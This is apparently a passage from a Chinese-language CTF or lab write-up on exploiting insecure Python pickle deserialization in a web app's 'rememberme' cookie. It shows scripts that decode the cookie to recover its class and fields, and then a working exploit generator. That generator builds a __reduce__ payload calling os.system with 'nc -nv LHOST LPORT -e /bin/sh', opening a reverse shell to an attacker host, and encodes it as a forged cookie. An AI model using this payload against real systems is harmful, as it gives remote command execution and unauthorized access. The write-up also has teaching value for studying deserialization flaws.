可知程序使用了python3，接下来的利用思路就是构造python3的序列化代码替换rememberme，来进行反序列化达到命令执行的目的。

  

通常查找反序列时，都有源码参考，来构造可执行命令的序列化对象，这里我们需要获取类名、方法名、字段名等，才可构造。

  

首先，获取类名，以下代码作用为解码rememberme值，然后使用pickle获取class名称，pickle.dump用来序列化对象，pickle。load用来进行反序列化：

  

*   
*   
*   
*   
*   

```
import pickle, base64rememberme = input("rememberme= ")serialdata = base64.b64decode(rememberme)deserialdata = pickle.loads(serialdata)print(desrialdata.__class__)
```

  

运行后报错，但是类名实际上已经输出了，为usr，发现就是我们上面base64解码后的内容：

  

![](../Images/d21023eeebd42eff1e0db9bfbc522841.png)

  

有了类名，就可以继续尝试获取方法名，使用dir来获取对象的属性列表：

*   
*   

```
import pickle, base64class usr(object):    passdeserialdata = usr()rememberme = input("rememberme= ")serialdata = base64.b64decode(rememberme)deserialdata = pickle.loads(serialdata)print(dir(deserialdata))
```

运行上面脚本，发现除了自带的一些魔术方法外，有一个password和username属性：

import pickle, base64class usr(object):    passdeserialdata = usr()rememberme = input("rememberme= ")serialdata = base64.b64decode(rememberme)deserialdata = pickle.loads(serialdata)print(deserialdata.username)print(deserialdata.password)

确认了rememberme会进行反序列化，也确认了类名、方法名、字段值，下面写exp，相关代码如下：

  

思路：定义一个对象，对象包含了reduce魔术方法，该方法在对象被pickle时会被调用，常用来自定义错误，这里我们把要执行的命令放进去，然后进行序列化和base64编码。

  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
import pickle, base64,oslhost=input("LHOST: ")lport=input("LPORT: ")class payload(object):    def __reduce__(self):        return (os.system,(f"nc -nv {lhost} {lport} -e /bin/sh",))deserialpayload = payload()serialpayload = pickle.dumps(deserialpayload)rememberme = base64.b64encode(serialpayload)print(rememberme)
```
